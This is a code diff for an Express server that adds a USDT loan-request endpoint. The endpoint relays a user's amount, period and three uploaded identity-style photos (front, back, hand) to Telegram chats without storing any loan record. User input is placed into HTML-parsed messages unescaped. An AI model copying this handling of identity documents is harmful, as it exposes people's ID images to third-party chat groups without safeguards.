@@ -19,6 +19,53 @@ app.use(express.json());
 
 const PORT = process.env.PORT || 8080;
 
+/* ---------------------------------------------------------
+   Telegram Loan Notify Function
+--------------------------------------------------------- */
+async function sendLoanToTelegram(text, photos = []) {
+  const token = process.env.LOAN_TELEGRAM_BOT_TOKEN;
+  const chats = (process.env.LOAN_TELEGRAM_CHAT_IDS || '').split(',').filter(Boolean);
+
+  if (!token || chats.length === 0) {
+    console.error('❌ Loan Telegram bot not configured');
+    return;
+  }
+
+  for (const chatId of chats) {
+    try {
+      // 先发文字
+      await axios.post(
+        `https://api.telegram.org/bot${token}/sendMessage`,
+        {
+          chat_id: chatId,
+          text,
+          parse_mode: 'HTML'
+        },
+        { timeout: 10000 }
+      );
+
+      // 再发图片
+      for (const photo of photos) {
+        if (!photo) continue;
+
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('photo', photo.buffer, {
+          filename: photo.originalname || 'loan.jpg'
+        });
+
+        await axios.post(
+          `https://api.telegram.org/bot${token}/sendPhoto`,
+          fd,
+          { headers: fd.getHeaders(), timeout: 15000 }
+        );
+      }
+
+    } catch (err) {
+      console.error(`Telegram loan send error for chat ${chatId}:`, err.response?.data || err.message);
+    }
+  }
+}
 
 /* --------------------- Global safety handlers --------------------- */
 process.on('unhandledRejection', (reason, p) => {
@@ -930,6 +977,46 @@ app.post('/api/telegram/trade', upload.single('photo'), async (req, res) => {
   } catch (e) {
     console.error('[telegram notify trade error]', e.message);
     return res.status(500).json({ ok:false });
+  }
+});
+/* ---------------------------------------------------------
+   Loan order endpoint (ONLY notify Telegram)
+--------------------------------------------------------- */
+app.post('/api/order/loan', upload.fields([
+  { name: 'front', maxCount: 1 },
+  { name: 'back', maxCount: 1 },
+  { name: 'hand', maxCount: 1 }
+]), async (req, res) => {
+  try {
+    const {
+      userId,
+      amount,
+      period
+    } = req.body;
+
+    if (!userId || !amount || !period) {
+      return res.status(400).json({ success: false, message: 'Missing fields' });
+    }
+
+    const front = req.files?.front?.[0];
+    const back  = req.files?.back?.[0];
+    const hand  = req.files?.hand?.[0];
+
+    // 构造 Telegram 文本
+    const text = `🧾 <b>New Loan Request</b>
+👤 User ID: <code>${userId}</code>
+💰 Amount: <b>${amount} USDT</b>
+📅 Period: <b>${period} days</b>
+⏰ Time: ${new Date().toLocaleString()}`;
+
+    // 发送到 Telegram 群
+    await sendLoanToTelegram(text, [front, back, hand]);
+
+    return res.json({ success: true, orderId: 'loan_' + Date.now() });
+
+  } catch (e) {
+    console.error('[loan order error]', e);
+    return res.status(500).json({ success: false, message: 'Server error' });
   }
 });
 
